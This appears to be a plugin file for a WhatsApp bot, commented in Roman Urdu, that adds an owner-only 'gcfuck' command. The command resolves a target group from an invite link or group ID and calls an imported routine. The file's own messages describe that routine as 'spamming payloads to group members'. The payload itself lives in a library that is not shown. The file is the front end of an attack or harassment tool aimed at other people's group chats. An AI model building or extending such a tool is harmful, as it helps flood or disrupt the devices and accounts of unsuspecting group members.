// plugins/gcfuck.js
const { cmd } = require("../arslan");

let { Gcfuck } = require('../lib/gcfuck');

let handler = async (m, { conn, args, command, isCreator }) => {
    if (!isCreator) return m.reply('🔒 *Owner Only - Gcfuck Command!*');

    let input = args[0] ? args[0].trim() : '';
    let targetGroup = '';

    if (!input) {
        return m.reply(`📌 *Usage:* \n.${command} <group_link>\n.${command} <group_jid>\n*(Ya phir kisi group ke andar direct .${command} likhein)*`);
    }

    // Agar user ne WhatsApp invite link di hai
    if (input.includes('chat.whatsapp.com')) {
        let code = input.split('chat.whatsapp.com/')[1];
        if (!code) return m.reply('❌ *Invalid Group Link!*');
        try {
            let res = await conn.groupGetInviteInfo(code);
            targetGroup = res.id;
        } catch (e) {
            return m.reply('❌ *Group link invalid hai ya bot us group mein nahi hai / link expire ho chuki hai.*');
        }
    } 
    // Agar user ne direct Group JID di hai
    else if (input.endsWith('@g.us')) {
        targetGroup = input;
    } 
    // Agar kuch aur likha hai toh current chat utha le (agar group hai)
    else if (m.isGroup) {
        targetGroup = m.chat;
    } else {
        return m.reply('❌ *Koyi valid Group Link ya Group JID provide karein!*');
    }

    await m.reply(`🔥 *Gcfuck Initialized!*\n🎯 *Target Group:* ${targetGroup}\n⚡ *Spamming payloads to group members...*`);

    try {
        await Gcfuck(conn, targetGroup);

        await conn.sendMessage(m.chat, {
            react: { text: "💀", key: m.key }
        });

    } catch (error) {
        console.error("Gcfuck Plugin Error:", error);
        m.reply("⚠️ Error: Gcfuck execute karte waqt masla aaya hai.");
    }
}

handler.command = ['gcfuck', 'rizogcfuck'];
handler.tags = ['owner', 'rizo'];
handler.help = ['gcfuck <link/jid>'];
module.exports = handler;
